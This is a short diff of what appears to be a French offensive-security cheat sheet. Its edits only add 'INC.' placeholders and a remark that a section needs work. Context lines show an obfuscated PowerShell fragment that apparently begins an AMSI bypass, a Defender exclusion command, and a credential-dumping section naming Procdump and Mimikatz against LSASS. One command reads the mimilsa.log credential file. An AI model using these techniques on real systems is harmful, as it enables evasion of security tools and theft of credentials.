@@ -534,7 +534,7 @@ $bncYsK0MlQXwYafCQC=$null;$fR_nvfL="System.$(('Mänä'+'gémè'+'nt').noRMALiZe(
 
 
 
-
+INC.
 
 
 ---
@@ -653,6 +653,11 @@ Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
 ## __PLAINTEXT CREDENTIALS__ 
 
 
+
+*Cette partie a besoin d'être amélioré*
+
+
+
 > ATT&CK Tactic : Credential Access <br>
 > ATT&CK Technique : OS Credential Dumping → LSASS Memory T1003.001-008 <br>
 > Outils : Procdump, Mimikatz
@@ -753,7 +758,7 @@ gc c:\windows\system32\mimilsa.log
 
 
 
-
+INC.
 
 
 
